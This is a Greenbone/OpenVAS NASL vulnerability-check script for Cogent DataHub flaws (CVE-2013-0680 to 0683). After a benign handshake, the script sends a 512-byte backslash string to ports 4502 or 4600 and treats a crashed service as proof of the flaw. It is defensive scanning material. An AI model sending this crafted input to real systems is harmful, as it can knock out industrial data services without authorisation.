# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803491");
  script_version("2022-06-03T08:34:33+0000");
  script_tag(name:"last_modification", value:"2022-06-03 08:34:33 +0000 (Fri, 03 Jun 2022)");
  script_tag(name:"creation_date", value:"2013-04-16 11:21:21 +0530 (Tue, 16 Apr 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2013-0680", "CVE-2013-0681", "CVE-2013-0682", "CVE-2013-0683");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Cogent DataHub Multiple Vulnerabilities - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(4502, 4600);

  script_tag(name:"summary", value:"Cogent DataHub is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted requests and checks the responses.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - Improper handling of formatted text commands

  - Improper validation of HTTP request with a long header parameter

  - Error within string handling");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary code or cause denial of service condition resulting in loss of availability.");

  script_tag(name:"affected", value:"Cogent DataHub before 7.3.0, OPC DataHub before 6.4.22,
  Cascade DataHub before 6.4.22 on Windows and DataHub QuickTrend before 7.3.0.");

  script_tag(name:"solution", value:"Update to Cogent DataHub 7.3.0, OPC DataHub 6.4.22,
  Cascade DataHub 6.4.22, DataHub QuickTrend 7.3.0 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/52945");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58902");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58905");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58909");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58910");
  script_xref(name:"URL", value:"http://www.cogentdatahub.com/ReleaseNotes.html");

  exit(0);
}

include("misc_func.inc");

port = 4502;

if (!get_port_state(port)) {
  port = 4600;
  if (!get_port_state(port))
    exit(0);
}

soc = open_sock_tcp(port);
if (!soc)
  exit(0);

vt_strings = get_vt_strings();
payload = vt_strings["lowercase"] + "-test";

req = string('(domain "' + payload + '")', raw_string(0x0a));
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);

if(!res || 'success "domain" "' + payload + '"' >!< res) {
  close(soc);
  exit(0);
}

attack = crap(data: "\\", length:512);
req = string('domain ', attack, '\r\n');

send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

sleep(1);

soc = open_sock_tcp(port);
if(!soc) {
  security_message(port:port);
  exit(0);
}

req = string('(domain "' + payload + '")', raw_string(0x0a));
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

if (! res || 'success "domain" "' + payload + '"' >!< res) {
  security_message(port:port);
  exit(0);
}

exit(99);
